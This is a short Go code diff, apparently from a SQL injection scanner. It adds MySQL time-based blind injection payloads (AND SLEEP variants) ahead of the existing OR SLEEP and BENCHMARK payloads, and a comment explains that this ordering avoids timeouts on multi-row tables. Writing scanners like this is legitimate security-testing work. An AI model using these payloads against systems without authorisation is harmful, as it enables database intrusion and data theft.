@@ -39,7 +39,12 @@ type payload struct {
 }
 
 var payloads = []payload{
-	// MySQL
+	// MySQL — AND-based payloads first: SLEEP runs exactly once on the
+	// matching row, avoiding N×SLEEP timeouts on multi-row tables.
+	{name: "mysql-and-sleep-quote", dbType: "mysql", prefix: "1' AND SLEEP(", sleepFn: "%d", suffix: ") AND '1'='1"},
+	{name: "mysql-and-sleep-num", dbType: "mysql", prefix: "1 AND SLEEP(", sleepFn: "%d", suffix: ")-- -"},
+
+	// MySQL — OR-based (catches cases where id=1 doesn't match)
 	{name: "mysql-sleep-quote", dbType: "mysql", prefix: "' OR SLEEP(", sleepFn: "%d", suffix: ")-- -"},
 	{name: "mysql-sleep-num", dbType: "mysql", prefix: "1 OR SLEEP(", sleepFn: "%d", suffix: ")-- -"},
 	{name: "mysql-benchmark", dbType: "mysql", prefix: "' OR BENCHMARK(10000000,SHA1('", sleepFn: "test", suffix: "'))-- -"},
